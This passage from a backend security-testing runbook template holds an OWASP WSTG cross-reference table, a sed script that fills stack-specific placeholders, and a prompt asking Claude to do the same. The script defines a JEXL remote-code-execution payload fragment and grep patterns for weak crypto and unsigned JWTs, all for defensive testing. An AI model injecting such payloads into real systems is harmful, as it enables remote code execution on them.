# Verify {{DEP_LOCK_FILE}} is committed and up to date
git diff HEAD {{DEP_LOCK_FILE}}

# Verify no dependency has been swapped (checksum integrity)
# Tool depends on build system — e.g.:
#   Gradle: ./gradlew --write-verification-metadata sha256
#   pip: pip-compile --generate-hashes
#   npm: npm ci (uses package-lock.json hashes)
```

---

## 15 — WSTG Checklist Cross-Reference

| WSTG ID | Test Name | Runbook Section |
|---|---|---|
| WSTG-CONF-02 | Test Application Platform Configuration | §12 |
| WSTG-CONF-05 | Enumerate Infrastructure & Application Admin Interfaces | §11 |
| WSTG-CONF-07 | Test HTTP Strict Transport Security | §11 (server config) |
| WSTG-IDNT-01 | Test Role Definitions | §1 |
| WSTG-ATHN-02 | Test Default Credentials | §12 |
| WSTG-ATHN-04 | Testing for Bypassing Authentication Schema | §1, §6 |
| WSTG-ATHZ-01 | Testing Directory Traversal / File Include | §9 |
| WSTG-ATHZ-02 | Testing for Bypassing Authorization Schema | §1 |
| WSTG-ATHZ-04 | Testing for IDOR | §1 |
| WSTG-SESS-10 | Testing JSON Web Tokens | §6 |
| WSTG-INPV-05 | Testing for SQL Injection | §2, §3 |
| WSTG-INPV-11 | Testing for Code Injection | §4 |
| WSTG-INPV-13 | Testing for Formula Injection | §10 |
| WSTG-INPV-19 | Testing for Server-Side Request Forgery | §7 |
| WSTG-INPV-20 | Testing for Mass Assignment | §5 |
| WSTG-ERRH-01 | Testing for Improper Error Handling | §11 |
| WSTG-ERRH-02 | Testing for Stack Traces | §11 |
| WSTG-APIT-01 | Testing GraphQL | §2 (adapt query surface) |
| WSTG-APIT-02 | Testing REST | §1, §2 |

---

## 16 — Hydration Script & Claude Prompt

### Option A — Bash `sed` script

Copy this script, fill in every `=` assignment, then run:

```bash
#!/usr/bin/env bash
# hydrate-backend-runbook.sh
# Fill in every value, then: bash hydrate-backend-runbook.sh

STACK_NAME="MyProject"
BACKEND_LANGUAGE="Kotlin"
FILE_EXT="kotlin"
SRC_ROOT="src/main/kotlin"
TEST_ROOT="src/test/kotlin"
BACKEND_FRAMEWORK="Spring Boot 2.7.18"
AUTH_FRAMEWORK="Spring Security 5.8.16"
ORM_PRIMARY="JPA/Hibernate"
ORM_SECONDARY="MyBatis"
SAFE_PARAM_SYNTAX="#{}"
UNSAFE_PARAM_SYNTAX='\$\{'
EXPR_ENGINE="JEXL3"
EXPR_IMPORT_PATTERN="JexlEngine\\|JexlBuilder"
EXPR_EVAL_PATTERN="\\.evaluate\\(\\|\\.execute\\("
EXPR_SANDBOX_PATTERN="setSandbox\\|JexlSandbox"
EXPR_RCE_PAYLOAD="''.class.forName('java.lang.Runtime')"
MASS_ASSIGN_PATTERN="BeanUtils\\.(populate\\|copyProperties)"
ENTITY_ANNOTATION="@Entity"
REQUEST_BODY_ANNOTATION="@RequestBody"
JWT_LIBRARY="Nimbus JOSE 10.4.2"
JWT_PARSE_PATTERN="SignedJWT\\.parse\\|JWTParser"
JWT_VERIFY_PATTERN="\\.verify\\("
JWT_NONE_PATTERN="JWSAlgorithm\\.NONE\\|\"none\""
JWT_ALG_SAFE="RS256"
AUTH_PROVIDER="AWS Cognito"
HTTP_CLIENT="RestTemplate/WebClient"
HTTP_CLIENT_PATTERN="restTemplate\\.\\|WebClient\\."
URL_PARAM_PATTERN="@RequestParam.*[Uu]rl"
CRYPTO_LIBRARY="Bouncy Castle 1.81"
KMS_PROVIDER="AWS KMS"
KMS_CLIENT_PATTERN="AwsCrypto\\|KMSClient"
CRYPTO_CONTEXT_PATTERN="GenerateDataKeyRequest\\|EncryptRequest"
WEAK_ALGO_PATTERN='"DES"\\|"RC4"\\|"ECB"\\|"MD5"'
FILE_ACCESS_API="File() / Paths.get()"
FILE_ACCESS_PATTERN="File\\s*\\(\\|Paths\\.get\\("
CSV_LIBRARY="OpenCSV"
CSV_WRITE_PATTERN="CSVWriter\\|StatefulBeanToCsv"
HEALTH_ENDPOINT="actuator"
HEALTH_EXPOSURE_PATTERN="exposure\\.include.*\\*"
IN_MEM_DB_PATTERN="h2-console\\|:mem:"
TEST_FRAMEWORK="JUnit 5"
TEST_BASE_CLASS="SecurityTestBase"
HTTP_TEST_CLIENT="MockMvc"
DB_CONTAINER="postgres:15-alpine"
MOCK_LIBRARY="Mockito"
ASSERT_LIBRARY="assertThrows"
AUTH_TEST_HELPER="forgeJwt"
DEP_AUDIT_CMD="./gradlew dependencyCheckAnalyze"
DEP_LOCK_FILE="gradle/verification-metadata.xml"
STACK_SPECIFIC_SECTION="Spring Security 5.8.x specific traps"

INPUT_AGENT="security-tester-backend-generic.md"
INPUT_RUNBOOK="security-testing-runbook-backend-generic.md"
OUTPUT_AGENT="security-tester-${STACK_NAME,,}-backend.md"
OUTPUT_RUNBOOK="security-testing-runbook-${STACK_NAME,,}-backend.md"

for FILE in "$INPUT_AGENT" "$INPUT_RUNBOOK"; do
  OUTPUT="${FILE/generic/${STACK_NAME,,}}"
  sed \
    -e "s|{{STACK_NAME}}|${STACK_NAME}|g" \
    -e "s|{{BACKEND_LANGUAGE}}|${BACKEND_LANGUAGE}|g" \
    -e "s|{{FILE_EXT}}|${FILE_EXT}|g" \
    -e "s|{{SRC_ROOT}}|${SRC_ROOT}|g" \
    -e "s|{{TEST_ROOT}}|${TEST_ROOT}|g" \
    -e "s|{{BACKEND_FRAMEWORK}}|${BACKEND_FRAMEWORK}|g" \
    -e "s|{{AUTH_FRAMEWORK}}|${AUTH_FRAMEWORK}|g" \
    -e "s|{{ORM_PRIMARY}}|${ORM_PRIMARY}|g" \
    -e "s|{{ORM_SECONDARY}}|${ORM_SECONDARY}|g" \
    -e "s|{{SAFE_PARAM_SYNTAX}}|${SAFE_PARAM_SYNTAX}|g" \
    -e "s|{{UNSAFE_PARAM_SYNTAX}}|${UNSAFE_PARAM_SYNTAX}|g" \
    -e "s|{{EXPR_ENGINE}}|${EXPR_ENGINE}|g" \
    -e "s|{{EXPR_IMPORT_PATTERN}}|${EXPR_IMPORT_PATTERN}|g" \
    -e "s|{{EXPR_EVAL_PATTERN}}|${EXPR_EVAL_PATTERN}|g" \
    -e "s|{{EXPR_SANDBOX_PATTERN}}|${EXPR_SANDBOX_PATTERN}|g" \
    -e "s|{{EXPR_RCE_PAYLOAD}}|${EXPR_RCE_PAYLOAD}|g" \
    -e "s|{{MASS_ASSIGN_PATTERN}}|${MASS_ASSIGN_PATTERN}|g" \
    -e "s|{{ENTITY_ANNOTATION}}|${ENTITY_ANNOTATION}|g" \
    -e "s|{{REQUEST_BODY_ANNOTATION}}|${REQUEST_BODY_ANNOTATION}|g" \
    -e "s|{{JWT_LIBRARY}}|${JWT_LIBRARY}|g" \
    -e "s|{{JWT_PARSE_PATTERN}}|${JWT_PARSE_PATTERN}|g" \
    -e "s|{{JWT_VERIFY_PATTERN}}|${JWT_VERIFY_PATTERN}|g" \
    -e "s|{{JWT_NONE_PATTERN}}|${JWT_NONE_PATTERN}|g" \
    -e "s|{{JWT_ALG_SAFE}}|${JWT_ALG_SAFE}|g" \
    -e "s|{{AUTH_PROVIDER}}|${AUTH_PROVIDER}|g" \
    -e "s|{{HTTP_CLIENT}}|${HTTP_CLIENT}|g" \
    -e "s|{{HTTP_CLIENT_PATTERN}}|${HTTP_CLIENT_PATTERN}|g" \
    -e "s|{{URL_PARAM_PATTERN}}|${URL_PARAM_PATTERN}|g" \
    -e "s|{{CRYPTO_LIBRARY}}|${CRYPTO_LIBRARY}|g" \
    -e "s|{{KMS_PROVIDER}}|${KMS_PROVIDER}|g" \
    -e "s|{{KMS_CLIENT_PATTERN}}|${KMS_CLIENT_PATTERN}|g" \
    -e "s|{{CRYPTO_CONTEXT_PATTERN}}|${CRYPTO_CONTEXT_PATTERN}|g" \
    -e "s|{{WEAK_ALGO_PATTERN}}|${WEAK_ALGO_PATTERN}|g" \
    -e "s|{{FILE_ACCESS_API}}|${FILE_ACCESS_API}|g" \
    -e "s|{{FILE_ACCESS_PATTERN}}|${FILE_ACCESS_PATTERN}|g" \
    -e "s|{{CSV_LIBRARY}}|${CSV_LIBRARY}|g" \
    -e "s|{{CSV_WRITE_PATTERN}}|${CSV_WRITE_PATTERN}|g" \
    -e "s|{{HEALTH_ENDPOINT}}|${HEALTH_ENDPOINT}|g" \
    -e "s|{{HEALTH_EXPOSURE_PATTERN}}|${HEALTH_EXPOSURE_PATTERN}|g" \
    -e "s|{{IN_MEM_DB_PATTERN}}|${IN_MEM_DB_PATTERN}|g" \
    -e "s|{{TEST_FRAMEWORK}}|${TEST_FRAMEWORK}|g" \
    -e "s|{{TEST_BASE_CLASS}}|${TEST_BASE_CLASS}|g" \
    -e "s|{{HTTP_TEST_CLIENT}}|${HTTP_TEST_CLIENT}|g" \
    -e "s|{{DB_CONTAINER}}|${DB_CONTAINER}|g" \
    -e "s|{{MOCK_LIBRARY}}|${MOCK_LIBRARY}|g" \
    -e "s|{{ASSERT_LIBRARY}}|${ASSERT_LIBRARY}|g" \
    -e "s|{{AUTH_TEST_HELPER}}|${AUTH_TEST_HELPER}|g" \
    -e "s|{{DEP_AUDIT_CMD}}|${DEP_AUDIT_CMD}|g" \
    -e "s|{{DEP_LOCK_FILE}}|${DEP_LOCK_FILE}|g" \
    -e "s|{{STACK_SPECIFIC_SECTION}}|${STACK_SPECIFIC_SECTION}|g" \
    "$FILE" > "$OUTPUT"
  echo "Generated: $OUTPUT"
done
```

### Option B — Claude hydration prompt

Paste this prompt to Claude with the generic files attached:

```
I need you to hydrate the backend security testing templates for a new project.

Tech stack:
- Project name: [NAME]
- Language: [LANGUAGE + VERSION]
- Framework: [FRAMEWORK + VERSION]
- Auth library: [AUTH LIB + VERSION]
- Primary ORM: [ORM + VERSION]
- Secondary ORM or query mechanism: [ORM2 or "none"]
- JWT library: [JWT LIB + VERSION]
- Expression engine: [ENGINE or "none"]
- HTTP client: [CLIENT]
- Crypto library: [CRYPTO LIB]
- KMS provider: [KMS or "none"]
- Test framework: [TEST FRAMEWORK]
- Dependency audit command: [COMMAND]

Instructions:
1. Replace every {{PLACEHOLDER}} in the attached generic agent and runbook
   with the concrete value for this stack.
2. For {{EXPR_ENGINE}} = "none": remove sections §4 entirely.
3. For {{ORM_SECONDARY}} = "none": remove section §3 entirely.
4. In §13, add 3-5 framework-version-specific traps relevant to [FRAMEWORK + VERSION].
5. In all grep patterns, adapt the regex to match [LANGUAGE] idioms.
6. In all test templates, rewrite pseudocode to [TEST FRAMEWORK] syntax.
7. Output two complete files: security-tester-[name]-backend.md and
   security-testing-runbook-[name]-backend.md
```
